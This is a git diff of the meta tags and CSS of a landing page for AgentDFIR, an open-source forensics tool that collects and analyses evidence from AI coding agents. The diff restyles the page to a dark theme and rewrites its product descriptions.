@@ -3,27 +3,27 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>AgentDFIR — Forensics for AI agents</title>
-<meta name="description" content="Open-source DFIR for AI agents. One command finds every AI agent on a machine — Claude Code, Codex, Cursor, Gemini CLI, Copilot and more — seals its evidence, analyzes it and explains what happened in plain language. Nothing leaves your machine.">
+<title>AgentDFIR — Incident response for AI agents</title>
+<meta name="description" content="Open-source DFIR for AI agents. Collect Claude Code, Codex, Cursor, Gemini CLI, Copilot and other agent evidence into sealed, hash-chained packages, reconstruct attack chains mapped to MITRE ATLAS, and see the exact log line behind every finding. Nothing leaves the machine.">
 <link rel="canonical" href="https://efij.github.io/AgentDFIR/">
-<meta name="theme-color" content="#ffffff">
+<meta name="theme-color" content="#0a0d12">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="AgentDFIR">
-<meta property="og:title" content="What did your AI agents actually do?">
-<meta property="og:description" content="One command finds every AI agent on your machine, seals its evidence and shows you, step by step, what it did. Open source. Nothing leaves your machine.">
+<meta property="og:title" content="AgentDFIR — Incident response for AI agents">
+<meta property="og:description" content="Sealed evidence, reconstructed attack chains and the exact log line behind every finding, for Claude Code, Codex, Cursor, Gemini, Copilot and more. Open source.">
 <meta property="og:url" content="https://efij.github.io/AgentDFIR/">
 <meta property="og:image" content="https://efij.github.io/AgentDFIR/og.png">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
-<meta property="og:image:alt" content="AgentDFIR: What did your AI agents actually do?">
+<meta property="og:image:alt" content="AgentDFIR case explorer showing an attack chain: credential file read, then data sent to an outside address.">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="What did your AI agents actually do?">
-<meta name="twitter:description" content="Open-source forensics for Claude Code, Codex, Cursor, Gemini CLI, Copilot and more. Sealed evidence, plain-language findings, nothing leaves your machine.">
+<meta name="twitter:title" content="AgentDFIR — Incident response for AI agents">
+<meta name="twitter:description" content="Open-source DFIR for Claude Code, Codex, Cursor, Gemini CLI, Copilot and more. Sealed evidence, attack chains mapped to MITRE ATLAS, nothing leaves the machine.">
 <meta name="twitter:image" content="https://efij.github.io/AgentDFIR/og.png">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='9' fill='%2317191c'/%3E%3Ccircle cx='14.5' cy='14.5' r='6' fill='none' stroke='%23fbe1d1' stroke-width='2.6'/%3E%3Cpath d='m19 19 5 5' stroke='%23fbe1d1' stroke-width='2.6' stroke-linecap='round'/%3E%3C/svg%3E">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%230a0d12'/%3E%3Cpath d='M16 5 7 8.5v6.6c0 5.6 3.8 10 9 11.9 5.2-1.9 9-6.3 9-11.9V8.5z' fill='none' stroke='%23ffb224' stroke-width='2.2' stroke-linejoin='round'/%3E%3Cpath d='M11.5 16.2 14.6 19l6-6.4' fill='none' stroke='%23ffb224' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Geist:wght@400;450;500&family=Geist+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
@@ -56,450 +56,553 @@
 </script>
 <style>
 :root{
-  color-scheme:light;
-  --ink:#17191c; --paper:#ffffff; --mist:#f2f2f3; --fog:#fafafb;
-  --slate:#777b86; --ash:#979799; --smoke:#a3a6af; --line:#ececec;
-  --peach:#fbe1d1; --sienna:#5d2a1a;
-  --serif:'Instrument Serif',ui-serif,Georgia,'Times New Roman',serif;
+  color-scheme:dark;
+  --bg:#0a0d12; --bg-2:#0d1118; --surface:#121824; --surface-2:#171e2c;
+  --line:#1e2533; --line-2:#2a3344;
+  --text:#e8ebf0; --muted:#98a1b0; --dim:#6b7486;
+  --amber:#ffb224; --amber-dim:rgba(255,178,36,.12);
+  --red:#ff5a5f; --red-dim:rgba(255,90,95,.12); --green:#3dd68c;
   --sans:'Geist',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;
-  --mono:'Geist Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
-  --float:0 0 0 1px rgba(4,23,43,.05),0 20px 25px -5px rgba(0,0,0,.1),0 8px 10px -6px rgba(0,0,0,.1);
-  --pop:0 0 0 1px rgba(0,0,0,.05),0 4px 24px rgba(0,0,0,.08);
+  --mono:'Geist Mono',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
   --maxw:1200px;
 }
 *{box-sizing:border-box;margin:0;padding:0}
-html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:clip}
-body{background:var(--paper);color:var(--ink);font-family:var(--sans);font-size:17px;line-height:1.5;font-weight:400;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;overflow-x:hidden}
+html{scroll-behavior:smooth;scroll-padding-top:80px;overflow-x:clip;-webkit-text-size-adjust:100%}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:16px;line-height:1.6;-webkit-font-smoothing:antialiased}
 a{color:inherit;text-decoration:none}
-a:focus-visible,button:focus-visible,summary:focus-visible{outline:2px solid var(--ink);outline-offset:3px;border-radius:6px}
-code{font-family:var(--mono);font-size:.88em}
+a:focus-visible,button:focus-visible,summary:focus-visible{outline:2px solid var(--amber);outline-offset:3px;border-radius:6px}
+code,pre,.mono{font-family:var(--mono)}
+code{font-size:.9em;color:#d6dbe3}
 .wrap{max-width:var(--maxw);margin:0 auto;padding:0 24px}
-h1,h2{font-family:var(--serif);font-weight:400;color:var(--ink)}
-h2{font-size:clamp(40px,5.4vw,64px);line-height:1.04;letter-spacing:-.015em}
-h2 em,h1 em{font-style:italic}
-h3{font-size:20px;font-weight:500;letter-spacing:-.005em;line-height:1.3}
-.lede{font-size:20px;line-height:1.45;color:var(--slate);font-weight:430;max-width:34em}
-.pill{display:inline-flex;align-items:center;justify-content:center;gap:8px;height:44px;padding:0 20px;border-radius:9999px;font:inherit;font-size:16px;cursor:pointer;border:1px solid var(--ink);white-space:nowrap;transition:background .15s,color .15s}
-.pill.fill{background:var(--ink);color:#fff}
-.pill.fill:hover{background:#2c2f34}
-.pill.ghost{background:transparent;color:var(--ink)}
-.pill.ghost:hover{background:var(--mist)}
-.tlink{font-size:16px;border-bottom:1px solid transparent}
-.tlink:hover{border-bottom-color:currentColor}
+h1,h2,h3{font-weight:600;letter-spacing:-.03em;color:#f3f5f8}
+h1{font-size:clamp(44px,6vw,76px);line-height:1;letter-spacing:-.045em}
+h2{font-size:clamp(32px,4vw,48px);line-height:1.08}
+h3{font-size:18px;letter-spacing:-.015em;line-height:1.3}
+.sub{font-size:18px;color:var(--muted);max-width:40em;line-height:1.6}
+.btn{display:inline-flex;align-items:center;gap:8px;height:42px;padding:0 18px;border-radius:8px;font:500 15px/1 var(--sans);cursor:pointer;border:1px solid var(--line-2);color:var(--text);background:var(--surface);white-space:nowrap;transition:border-color .15s,background .15s}
+.btn:hover{border-color:#3b465b;background:var(--surface-2)}
+.btn.primary{background:var(--amber);border-color:var(--amber);color:#1a1200}
+.btn.primary:hover{background:#ffc24d;border-color:#ffc24d}
 
-/* nav */
-.nav{position:relative;z-index:5}
-.nav .wrap{display:flex;align-items:center;justify-content:space-between;height:76px;gap:24px}
-.brand{display:flex;align-items:center;gap:10px;font-weight:500;font-size:17px;letter-spacing:-.01em}
-.brand svg{flex:none}
-.nav-links{display:flex;gap:32px;font-size:16px}
-.nav-links a{padding:2px 0;border-bottom:1px solid transparent}
-.nav-links a:hover{border-bottom-color:var(--ink)}
-.nav-cta{display:flex;align-items:center;gap:20px}
-.nav-cta .pill{height:40px}
-.stars{display:inline-flex;align-items:center;gap:6px;font-size:16px}
+/* nav — always on top */
+.nav{position:sticky;top:0;z-index:50;background:rgba(10,13,18,.82);-webkit-backdrop-filter:saturate(140%) blur(12px);backdrop-filter:saturate(140%) blur(12px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;gap:28px;height:62px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:600;font-size:16px;letter-spacing:-.01em}
+.nav-links{display:flex;gap:24px;font-size:14.5px;color:var(--muted);margin-left:12px}
+.nav-links a:hover{color:var(--text)}
+.nav-r{margin-left:auto;display:flex;align-items:center;gap:10px}
+.nav-r .btn{height:36px;padding:0 14px;font-size:14px}
+.ver{font-family:var(--mono);font-size:12.5px;color:var(--dim);border:1px solid var(--line);border-radius:6px;padding:4px 8px}
+.ver:hover{color:var(--text);border-color:var(--line-2)}
 
 /* hero */
-.hero{position:relative;padding:40px 0 64px}
-.stage{position:relative;max-width:var(--maxw);margin:0 auto;padding-bottom:40px}
-.hero-copy{position:relative;z-index:2;max-width:760px;margin:0 auto;padding:72px 24px 0;text-align:center}
-.hero h1{font-size:clamp(56px,8.4vw,98px);line-height:.98;letter-spacing:-.025em}
-.hero .lede{margin:26px auto 0;text-align:center;max-width:31em;color:var(--slate);font-size:19px}
-.hero .ctas{display:flex;gap:12px;justify-content:center;margin-top:32px;flex-wrap:wrap}
+.hero{position:relative;padding:88px 0 0;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);background-size:56px 56px;opacity:.35;-webkit-mask-image:radial-gradient(ellipse 70% 60% at 50% 0%,#000 30%,transparent 75%);mask-image:radial-gradient(ellipse 70% 60% at 50% 0%,#000 30%,transparent 75%);pointer-events:none}
+.hero .wrap{position:relative}
+.hero-grid{display:grid;grid-template-columns:minmax(0,1.05fr) minmax(0,.95fr);gap:56px;align-items:end}
+.status{display:inline-flex;align-items:center;gap:10px;font-family:var(--mono);font-size:13px;color:var(--muted);border:1px solid var(--line);background:var(--bg-2);border-radius:999px;padding:6px 14px 6px 10px;margin-bottom:28px}
+.status i{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 0 4px rgba(61,214,140,.15)}
+.status a{color:var(--text)}
+.hero h1 .a{color:var(--amber)}
+.hero .sub{margin-top:24px}
+.ctas{display:flex;gap:10px;flex-wrap:wrap;margin-top:32px}
 
-.art{background:#fff;border-radius:20px;box-shadow:var(--float)}
-.k{font-size:13px;color:var(--ash)}
-.chip{flex:none;font-size:12px;border-radius:9999px;padding:3px 9px;background:var(--mist);color:var(--ink);font-weight:450}
-.chip.act{background:var(--peach);color:var(--sienna)}
+.term{border:1px solid var(--line);background:#07090d;border-radius:12px;overflow:hidden;box-shadow:0 30px 60px -30px rgba(0,0,0,.8)}
+.term-top{display:flex;align-items:center;gap:6px;height:40px;padding:0 6px 0 14px;border-bottom:1px solid var(--line);background:var(--bg-2)}
+.term-top .tabs{display:flex;gap:2px;margin-left:10px;overflow-x:auto;scrollbar-width:none}
+.term-top .tabs::-webkit-scrollbar{display:none}
+.term-top button{font:500 12.5px var(--mono);color:var(--dim);background:none;border:0;padding:6px 10px;border-radius:6px;cursor:pointer;white-space:nowrap}
+.term-top button[aria-selected="true"]{color:var(--text);background:var(--surface-2)}
+.dots{display:flex;gap:6px;flex:none}.dots i{width:10px;height:10px;border-radius:50%;background:#262e3c}
+.term-body{position:relative;padding:18px 18px 16px;font-family:var(--mono);font-size:13.5px;line-height:1.75}
+.term-body .cmd{display:flex;gap:10px;align-items:flex-start}
+.term-body .cmd code{flex:1;min-width:0;white-space:pre-wrap;word-break:break-all;color:#e8ebf0;font-size:13.5px}
+.term-body .p{color:var(--amber);user-select:none}
+.copy{flex:none;font:500 12px var(--mono);color:var(--muted);background:var(--surface);border:1px solid var(--line-2);border-radius:6px;padding:4px 10px;cursor:pointer}
+.copy:hover{color:var(--text)}
+.copy.ok{color:var(--green);border-color:rgba(61,214,140,.4)}
+.out{color:var(--dim);white-space:pre;overflow-x:auto;margin-top:10px;font-size:12.5px;line-height:1.7;scrollbar-width:thin}
+.out b{color:var(--text);font-weight:500}.out .hi{color:var(--red)}.out .ok{color:var(--green)}.out .w{color:var(--amber)}
+.term-note{border-top:1px solid var(--line);padding:10px 18px;font-size:12.5px;color:var(--dim)}
+.term-note a{color:var(--muted);border-bottom:1px solid var(--line-2)}
+.term-note a:hover{color:var(--text)}
 
-.hero-cmd{position:relative;z-index:2;max-width:620px;margin:40px auto 0;text-align:left}
+/* spec strip */
+.spec{display:grid;grid-template-columns:repeat(6,1fr);border:1px solid var(--line);border-radius:12px;margin-top:64px;background:var(--bg-2)}
+.spec div{padding:16px 18px;border-left:1px solid var(--line)}
+.spec div:first-child{border-left:0}
+.spec b{display:block;font:600 22px/1.2 var(--sans);letter-spacing:-.02em;color:#f3f5f8}
+.spec span{font-size:13px;color:var(--muted)}
 
-/* the showcase: the real explorer, with two close-ups floating over it */
-.show{position:relative;max-width:1152px;margin:88px auto 0;padding:0 24px}
-.window{border-radius:20px;overflow:hidden;background:#fff;box-shadow:0 0 0 1px rgba(4,23,43,.06),0 40px 80px -24px rgba(23,25,28,.22),0 12px 24px -12px rgba(23,25,28,.12)}
-.wbar{display:flex;align-items:center;gap:7px;height:38px;padding:0 16px;background:var(--fog);border-bottom:1px solid var(--line)}
-.wbar i{width:10px;height:10px;border-radius:50%;background:#dcdde0}
-.wbar span{margin-left:12px;font-size:12px;color:var(--ash)}
-.show img{display:block;width:100%;height:auto}
-.shot{position:absolute;overflow:hidden;margin:0}
-.s-chain{width:400px;right:-56px;top:210px;transform:rotate(1.5deg)}
-.s-proof{width:560px;left:-56px;bottom:-72px;transform:rotate(-1deg)}
-.demo-note{text-align:center;font-size:13px;color:var(--ash);margin-top:120px;padding:0 24px}
-.demo-note code{font-size:12.5px}
-.reveal .s-chain,.reveal .s-proof{opacity:0;animation:land .7s cubic-bezier(.2,.7,.2,1) forwards}
-.reveal .s-chain{animation-delay:.5s;--r:1.5deg}
-.reveal .s-proof{animation-delay:.8s;--r:-1deg}
-@keyframes land{from{opacity:0;transform:translateY(24px) rotate(var(--r))}to{opacity:1;transform:rotate(var(--r))}}
+/* showcase */
+.show{position:relative;margin:56px auto 0;max-width:1200px;padding:0 24px}
+.window{border:1px solid var(--line-2);border-radius:14px;overflow:hidden;background:var(--bg-2);box-shadow:0 60px 120px -40px rgba(0,0,0,.9),0 0 0 1px rgba(255,255,255,.02)}
+.wbar{display:flex;align-items:center;gap:7px;height:36px;padding:0 14px;border-bottom:1px solid var(--line)}
+.wbar i{width:10px;height:10px;border-radius:50%;background:#262e3c}
+.wbar span{margin:0 auto;font:12px var(--mono);color:var(--dim);background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:3px 14px}
+.window img,.shot img,.pic img{display:block;width:100%;height:auto}
+.shot{position:absolute;right:-8px;top:18%;width:360px;border:1px solid var(--line-2);border-radius:12px;overflow:hidden;box-shadow:0 30px 60px -20px rgba(0,0,0,.9)}
+.fade{position:relative}
+.fade::after{content:"";position:absolute;left:0;right:0;bottom:0;height:160px;background:linear-gradient(transparent,var(--bg))}
 
-/* command composer */
-.cmd{padding:14px 14px 14px 18px}
-.cmd-tabs{display:flex;gap:4px;margin-bottom:10px}
-.cmd-tabs button{font:inherit;font-size:13px;border:0;background:transparent;color:var(--slate);padding:5px 11px;border-radius:9999px;cursor:pointer}
-.cmd-tabs button[aria-selected="true"]{background:var(--mist);color:var(--ink)}
-.cmd-line{display:flex;align-items:center;gap:12px;border:1px solid var(--line);border-radius:16px;padding:8px 8px 8px 16px}
-.cmd-line code{flex:1;min-width:0;font-size:13px;color:var(--ink);white-space:nowrap;overflow-x:auto;scrollbar-width:none;padding:8px 0}
-.cmd-line code::-webkit-scrollbar{display:none}
-.cmd-line code .p{color:var(--smoke);margin-right:8px;user-select:none}
-.send{flex:none;width:40px;height:40px;border-radius:50%;background:var(--ink);color:#fff;border:0;display:grid;place-items:center;cursor:pointer}
-.send:hover{background:#2c2f34}
-.cmd-note{font-size:12.5px;color:var(--slate);margin-top:10px;padding-left:4px}
-.cmd-note a{border-bottom:1px solid var(--line)}
-.cmd-note a:hover{border-bottom-color:var(--ink)}
+/* agents */
+.agents{padding:72px 0 8px;display:flex;gap:18px 28px;flex-wrap:wrap;align-items:baseline}
+.agents p{font-size:14px;color:var(--dim);margin-right:8px}
+.agents ul{list-style:none;display:flex;flex-wrap:wrap;gap:8px}
+.agents li{font:500 13.5px var(--mono);color:var(--muted);border:1px solid var(--line);border-radius:6px;padding:5px 10px;background:var(--bg-2)}
 
-/* products marquee line */
-.agents{padding:24px 0 96px;text-align:center}
-.agents p{font-size:15px;color:var(--ash);margin-bottom:18px}
-.agents ul{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:10px 30px;max-width:980px;margin:0 auto;font-size:22px;letter-spacing:-.01em;color:var(--ink);font-weight:430}
-
-/* sections */
-section{padding:112px 0}
-.band{background:var(--fog)}
-.split{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.08fr);gap:72px;align-items:center}
+section{padding:120px 0}
+.band{background:var(--bg-2);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.head{max-width:720px;margin-bottom:48px}
+.head .sub{margin-top:18px}
+.split{display:grid;grid-template-columns:minmax(0,.9fr) minmax(0,1.1fr);gap:64px;align-items:start}
+.split.rev{grid-template-columns:minmax(0,1.1fr) minmax(0,.9fr)}
 .split.rev>:first-child{order:2}
-.split .lede{margin-top:22px}
-.stack{display:flex;flex-direction:column;gap:120px}
+.pic{border:1px solid var(--line-2);border-radius:12px;overflow:hidden;background:var(--bg-2)}
+.pic.tall{max-height:720px}
 
 /* evidence ladder */
-.ladder{padding:10px 0}
-.ladder .q{padding:16px 22px 14px;border-bottom:1px solid var(--line)}
-.ladder .q code{font-size:13px}
-.ladder .q .k{margin-bottom:6px}
-.lrow{display:grid;grid-template-columns:150px 1fr auto;gap:14px;align-items:center;padding:13px 22px;font-size:15px}
-.lrow+.lrow{border-top:1px solid var(--line)}
-.lrow b{font-weight:500;font-size:14px}
-.lrow span{color:var(--slate)}
-.lrow i{font-style:normal;font-size:12px;color:var(--ash)}
-.lrow.on{background:var(--peach);color:var(--sienna)}
-.lrow.on span,.lrow.on i{color:var(--sienna)}
-.bar{display:inline-flex;gap:3px}
-.bar u{display:block;width:6px;height:14px;border-radius:2px;background:var(--mist);text-decoration:none}
-.bar u.f{background:var(--ink)}
-.lrow.on .bar u.f{background:var(--sienna)}
+.ladder{border:1px solid var(--line);border-radius:12px;overflow:hidden;background:var(--bg)}
+.lrow{display:grid;grid-template-columns:170px 1fr 88px;gap:16px;align-items:center;padding:14px 20px;border-top:1px solid var(--line);font-size:15px}
+.lrow:first-child{border-top:0}
+.lrow .st{font:600 13px var(--mono);letter-spacing:.02em}
+.lrow span{color:var(--muted)}
+.lrow .meter{display:flex;gap:3px;justify-content:flex-end}
+.lrow .meter u{width:14px;height:6px;border-radius:2px;background:var(--line-2);text-decoration:none}
+.st-req{color:#8fb4ff}.st-rep{color:var(--dim)}.st-obs{color:var(--text)}.st-cor{color:var(--green)}.st-con{color:var(--red)}.st-unk{color:var(--dim)}
+.lrow.cor{background:rgba(61,214,140,.06)}
+.lrow.cor .meter u{background:var(--green)}
+.lrow .meter u.f{background:#8f99ab}
+.lrow.con .meter u{background:var(--red)}
 
-/* explorer tour: real screenshots */
-.pic{margin:0;overflow:hidden}
-.pic img{display:block;width:100%;height:auto}
-.pic.tall{max-height:760px}
-.points{list-style:none;margin-top:28px;display:grid;gap:14px}
-.points li{padding-left:22px;position:relative;font-size:16px;line-height:1.5}
-.points li::before{content:"";position:absolute;left:0;top:.62em;width:8px;height:1px;background:var(--ink)}
-.points b{font-weight:500}
+/* chains */
+.chains{list-style:none;margin-top:28px;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.chains li{display:grid;grid-template-columns:1fr auto;gap:12px;padding:12px 16px;border-top:1px solid var(--line);font-size:14.5px;align-items:baseline}
+.chains li:first-child{border-top:0}
+.chains code{font-size:12px;color:var(--dim)}
+.sev{font:600 11px var(--mono);border-radius:4px;padding:2px 6px;margin-right:8px;vertical-align:1px}
+.sev.c{color:var(--red);background:var(--red-dim)}.sev.h{color:var(--amber);background:var(--amber-dim)}.sev.m{color:var(--muted);background:var(--surface-2)}
+.points{list-style:none;margin-top:28px;display:grid;gap:16px}
+.points li{padding-left:18px;border-left:2px solid var(--line-2);font-size:15.5px;color:var(--muted)}
+.points b{color:var(--text);font-weight:500}
 
-/* peach editorial card — used once */
-.peach{background:var(--peach);color:var(--sienna);border-radius:24px;padding:64px;display:grid;grid-template-columns:1.1fr 1fr;gap:56px;align-items:end}
-.peach h2{color:var(--sienna)}
-.peach p{font-size:18px;font-weight:430;line-height:1.5}
-.peach ul{list-style:none;display:grid;gap:12px;font-size:16px}
-.peach li{border-top:1px solid rgba(93,42,26,.18);padding-top:12px}
+/* custody */
+.pair{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.panel{border:1px solid var(--line);border-radius:12px;background:#07090d;overflow:hidden}
+.panel .ph{display:flex;justify-content:space-between;align-items:center;padding:10px 16px;border-bottom:1px solid var(--line);font:12.5px var(--mono);color:var(--dim)}
+.panel pre{padding:16px;font-size:12.5px;line-height:1.75;color:var(--muted);overflow-x:auto;white-space:pre}
+.panel pre b{color:var(--text);font-weight:500}.panel .ok{color:var(--green)}.panel .bad{color:var(--red)}.panel .c{color:var(--dim)}
 
-/* forensics */
-.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-top:56px}
-.card{background:var(--mist);border-radius:24px;padding:28px 24px 30px}
-.card .k{margin-bottom:26px}
-.card p{font-size:15.5px;line-height:1.5;margin-top:10px;color:#3d4046}
-.tree{font-family:var(--mono);font-size:13px;line-height:1.85;padding:22px 24px;white-space:pre;overflow-x:auto}
-.tree .c{color:var(--smoke)}
-.tree .d{font-weight:500}
+/* capability grid */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-top:56px}
+.cell{padding:28px 26px 30px;border-left:1px solid var(--line);border-top:1px solid var(--line);background:var(--bg)}
+.cell:nth-child(3n+1){border-left:0}
+.cell:nth-child(-n+3){border-top:0}
+.cell code.k{display:block;font-size:12px;color:var(--amber);margin-bottom:16px}
+.cell p{color:var(--muted);font-size:15px;margin-top:10px}
+
+/* ATLAS table */
+.atlas{width:100%;border-collapse:collapse;font-size:14px;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.tbl{border:1px solid var(--line);border-radius:12px;overflow:hidden;overflow-x:auto}
+.atlas th,.atlas td{text-align:left;padding:11px 16px;border-top:1px solid var(--line);vertical-align:top}
+.atlas thead th{border-top:0;font:500 12.5px var(--mono);color:var(--dim);background:var(--bg-2)}
+.atlas td:first-child{font:500 13px var(--mono);color:var(--amber);white-space:nowrap}
+.atlas td:nth-child(2){color:var(--text);white-space:nowrap}
+.atlas td:last-child{font:12.5px var(--mono);color:var(--muted)}
+.more{display:inline-block;margin-top:18px;font-size:14.5px;color:var(--muted);border-bottom:1px solid var(--line-2)}
+.more:hover{color:var(--text)}
+
+/* integrations */
+.integ{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.integ div{padding:20px 22px;border-left:1px solid var(--line)}
+.integ div:first-child{border-left:0}
+.integ h3{font-size:15px}
+.integ p{font:12.5px/1.8 var(--mono);color:var(--muted);margin-top:10px}
 
 /* install */
-.steps{list-style:none;counter-reset:s;display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin-top:56px}
-.steps li{min-width:0;counter-increment:s;background:#fff;border-radius:24px;padding:26px 22px;box-shadow:0 0 0 1px rgba(0,0,0,.05)}
-.steps li::before{content:counter(s);font-family:var(--serif);font-size:44px;line-height:1;display:block;margin-bottom:18px}
-.steps h3{font-size:18px}
-.steps p{font-size:15px;color:var(--slate);margin-top:6px}
-.steps code{display:block;margin-top:14px;font-size:12.5px;color:var(--ink);background:var(--fog);border-radius:10px;padding:8px 10px;overflow-x:auto;white-space:nowrap}
-.more-src{margin-top:48px;font-size:15px}
-.more-src div{display:grid;grid-template-columns:minmax(0,1.4fr) minmax(0,1fr);gap:24px;padding:14px 0;border-top:1px solid var(--line);align-items:baseline}
-.more-src code{font-size:13px;overflow-x:auto;white-space:nowrap;scrollbar-width:none}
-.more-src span{color:var(--slate)}
+.steps{list-style:none;display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.steps li{padding:24px 22px;border-left:1px solid var(--line);min-width:0;background:var(--bg)}
+.steps li:first-child{border-left:0}
+.steps .n{font:600 13px var(--mono);color:var(--amber)}
+.steps h3{margin-top:10px}
+.steps p{font-size:14.5px;color:var(--muted);margin-top:6px}
+.steps code{display:block;margin-top:14px;font-size:12.5px;background:#07090d;border:1px solid var(--line);border-radius:6px;padding:8px 10px;overflow-x:auto;white-space:nowrap;scrollbar-width:none}
+.chan{margin-top:24px;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.chan div{display:grid;grid-template-columns:180px minmax(0,1fr);gap:16px;padding:12px 18px;border-top:1px solid var(--line);align-items:baseline}
+.chan div:first-child{border-top:0}
+.chan span{font-size:14px;color:var(--muted)}
+.chan code{font-size:13px;overflow-x:auto;white-space:nowrap;scrollbar-width:none}
 
-/* faq */
-.faq{display:grid;grid-template-columns:repeat(2,1fr);gap:0 64px;margin-top:48px}
-.faq details{border-top:1px solid var(--line);padding:22px 0}
-.faq summary{cursor:pointer;list-style:none;font-size:20px;font-weight:450;letter-spacing:-.01em;display:flex;justify-content:space-between;gap:16px}
+/* faq + docs */
+.faq{display:grid;grid-template-columns:1fr 1fr;gap:0 48px}
+.faq details{border-top:1px solid var(--line);padding:20px 0}
+.faq summary{cursor:pointer;list-style:none;font-weight:500;font-size:17px;display:flex;justify-content:space-between;gap:16px}
 .faq summary::-webkit-details-marker{display:none}
-.faq summary::after{content:"+";font-weight:300;color:var(--slate);font-size:22px;line-height:1}
+.faq summary::after{content:"+";font-family:var(--mono);color:var(--dim)}
 .faq details[open] summary::after{content:"−"}
-.faq p{margin-top:12px;color:#3d4046;font-size:16px;line-height:1.6;max-width:38em}
-.faq a{border-bottom:1px solid var(--smoke)}
+.faq p{margin-top:12px;color:var(--muted);font-size:15px;max-width:40em}
+.faq a,.faq code{color:var(--text)}
+.docs{display:grid;grid-template-columns:repeat(3,1fr);gap:0 32px}
+.docs a{display:block;padding:16px 0;border-top:1px solid var(--line)}
+.docs b{display:block;font-weight:500;font-size:15.5px}
+.docs span{display:block;font-size:14px;color:var(--muted);margin-top:3px}
+.docs a:hover b{color:var(--amber)}
 
-/* docs */
-.docs{display:grid;grid-template-columns:repeat(3,1fr);gap:0 40px;margin-top:48px}
-.docs a{display:block;padding:18px 0;border-top:1px solid var(--line)}
-.docs a b{display:block;font-weight:500;font-size:16px}
-.docs a span{display:block;font-size:14px;color:var(--slate);margin-top:4px;line-height:1.45}
-.docs a:hover b{text-decoration:underline;text-underline-offset:3px}
+.close{text-align:center;padding:140px 0}
+.close h2{font-size:clamp(36px,5vw,60px);max-width:16em;margin:0 auto}
+.close .sub{margin:20px auto 0}
+.close .ctas{justify-content:center}
 
-/* closing */
-.close{text-align:center;padding:140px 0 120px}
-.close h2{font-size:clamp(48px,7vw,90px);letter-spacing:-.025em;line-height:1}
-.close .lede{margin:22px auto 0;text-align:center}
-.close .ctas{display:flex;gap:12px;justify-content:center;margin-top:34px;flex-wrap:wrap}
+footer{border-top:1px solid var(--line);padding:28px 0 40px;font-size:13.5px;color:var(--dim)}
+footer .wrap{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap}
+footer nav{display:flex;gap:22px}
+footer a:hover{color:var(--text)}
 
-footer{border-top:1px solid var(--line);padding:32px 0 48px;font-size:14px;color:var(--slate)}
-footer .wrap{display:flex;justify-content:space-between;gap:24px;flex-wrap:wrap}
-footer nav{display:flex;gap:24px}
-footer a:hover{color:var(--ink)}
 
-.toast{position:fixed;left:50%;bottom:28px;transform:translate(-50%,20px);background:var(--ink);color:#fff;border-radius:9999px;padding:10px 18px;font-size:14px;opacity:0;pointer-events:none;transition:opacity .2s,transform .2s;z-index:20}
-.toast.on{opacity:1;transform:translate(-50%,0)}
-.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
-
-/* responsive: close-ups tuck in, then drop below the window */
-@media (max-width:1240px){
-  .s-chain{right:0}
-  .s-proof{left:0}
-}
-@media (max-width:860px){
-  .shot{position:relative;left:auto;right:auto;top:auto;bottom:auto;transform:none;width:auto;margin-top:20px}
-  .reveal .s-chain,.reveal .s-proof{opacity:1;animation:none}
-  .demo-note{margin-top:28px}
-}
-@media (max-width:980px){
-  .nav-links{display:none}
-  .split{grid-template-columns:1fr;gap:48px}
-  .split.rev>:first-child{order:0}
-  .peach{grid-template-columns:1fr;padding:40px 28px;gap:32px}
-  .cards{grid-template-columns:1fr 1fr}
-  .steps{grid-template-columns:1fr 1fr}
-  .faq{grid-template-columns:1fr}
-  .docs{grid-template-columns:1fr 1fr}
-  section{padding:80px 0}
-  .stack{gap:80px}
-}
-@media (max-width:640px){
-  .wrap{padding:0 16px}
-  .hero-copy{padding:32px 16px 0}
-  .hero .lede{font-size:17px}
